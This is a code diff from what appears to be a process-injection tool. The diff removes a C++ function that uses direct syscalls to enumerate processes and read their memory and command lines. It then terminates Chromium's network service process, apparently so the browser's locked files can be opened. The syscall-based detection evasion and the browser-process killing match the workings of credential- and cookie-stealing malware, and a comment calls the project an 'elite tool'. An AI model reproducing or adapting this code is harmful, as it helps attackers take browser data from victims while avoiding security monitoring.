@@ -81,48 +81,4 @@ namespace Injector {
         }
     }
 
-    void ProcessManager::KillNetworkServices(const std::wstring& processName) {
-        Core::UniqueHandle hCurrentProc;
-        HANDLE nextProcHandle = nullptr;
-
-        while (NtGetNextProcess_syscall(hCurrentProc.get(), PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, 0, 0, &nextProcHandle) == 0) {
-            Core::UniqueHandle hNextProc(nextProcHandle);
-            hCurrentProc = std::move(hNextProc);
-
-            std::vector<BYTE> buffer(sizeof(UNICODE_STRING_SYSCALLS) + MAX_PATH * 2);
-            auto imageName = reinterpret_cast<PUNICODE_STRING_SYSCALLS>(buffer.data());
-            
-            if (NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessImageFileName, imageName, (ULONG)buffer.size(), NULL) != 0 || imageName->Length == 0)
-                continue;
-
-            std::wstring pPath(imageName->Buffer, imageName->Length / sizeof(wchar_t));
-            std::filesystem::path p(pPath);
-            
-            if (_wcsicmp(p.filename().c_str(), processName.c_str()) != 0)
-                continue;
-
-            PROCESS_BASIC_INFORMATION pbi{};
-            if (NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessBasicInformation, &pbi, sizeof(pbi), nullptr) != 0 || !pbi.PebBaseAddress)
-                continue;
-
-            // Read PEB to get command line
-            // Note: This is a simplified version. In a real elite tool, we'd be more robust reading remote memory.
-            // But for now, we follow the original logic.
-            PEB peb{};
-            if (NtReadVirtualMemory_syscall(hCurrentProc.get(), pbi.PebBaseAddress, &peb, sizeof(peb), nullptr) != 0) continue;
-            
-            RTL_USER_PROCESS_PARAMETERS params{};
-            if (NtReadVirtualMemory_syscall(hCurrentProc.get(), peb.ProcessParameters, &params, sizeof(params), nullptr) != 0) continue;
-
-            std::vector<wchar_t> cmdLine(params.CommandLine.Length / sizeof(wchar_t) + 1, 0);
-            if (params.CommandLine.Length > 0 && NtReadVirtualMemory_syscall(hCurrentProc.get(), params.CommandLine.Buffer, cmdLine.data(), params.CommandLine.Length, nullptr) == 0) {
-                if (wcsstr(cmdLine.data(), L"--utility-sub-type=network.mojom.NetworkService")) {
-                    NtTerminateProcess_syscall(hCurrentProc.get(), 0);
-                    // Wait for process to terminate and release file handles
-                    WaitForSingleObject(hCurrentProc.get(), 500);
-                }
-            }
-        }
-    }
-
 }
